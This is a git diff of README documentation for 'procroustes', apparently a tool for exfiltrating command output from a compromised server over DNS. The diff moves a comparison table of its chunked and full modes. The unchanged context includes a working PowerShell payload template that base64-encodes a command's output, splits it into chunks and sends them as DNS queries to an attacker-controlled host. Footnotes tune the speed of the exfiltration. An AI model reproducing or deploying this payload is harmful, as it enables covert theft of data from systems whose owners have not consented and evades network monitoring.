@@ -57,19 +57,6 @@ Contents of dispatcher.sh
 
 ### procroustes_chunked vs procroustes_full
 
-|                       | procroustes_chunked                | procroustes_full  |
-| -------------         |:-------------:               |:-----:         |
-| payload size overhead (sh/powershell) | 150\*NLABELS/500\*NLABELS                      | 300/750        |
-| dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[1] |   1👌          |
-| speed (sh/powershell)[2]                | ✔/✔                         |  ✔/😔         |
-
-[1] On procroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
-A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
-
-[2] We can speed up the exfiltration process by having the NS properly responding to the requests received. This is especially usefull in the case of procroustes_full/powershell
-
----------------------------------------
-
 In a nutshell, assuming we want to exfiltrate some data that has to be broken into four chunks in order to be able to be transmitted over DNS:
 * procroustes_chunked: calls the dispatcher four times, each time requesting a different chunk from the server
 * procroustes_full: calls the dispatcher once, the command that will get executed on the server will be responsible for chunking the data and sending them over.
@@ -93,6 +80,19 @@ procroustes_full/powershell:
 ```bash
 [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((%CMD%)+(echo "`n%SIGNATURE%"))) -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
 ```
+
+---------------------------------------
+
+|                       | procroustes_chunked                | procroustes_full  |
+| -------------         |:-------------:               |:-----:         |
+| payload size overhead (sh/powershell) | 150\*NLABELS/500\*NLABELS                      | 300/750        |
+| dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[1] |   1👌          |
+| speed (sh/powershell)[2]                | ✔/✔                         |  ✔/😔         |
+
+[1] On procroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
+A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
+
+[2] We can speed up the exfiltration process by having the NS properly responding to the requests received. This is especially usefull in the case of procroustes_full/powershell
 
 ### Todos
  - procroustes_full/powershell command can use some parallelization.
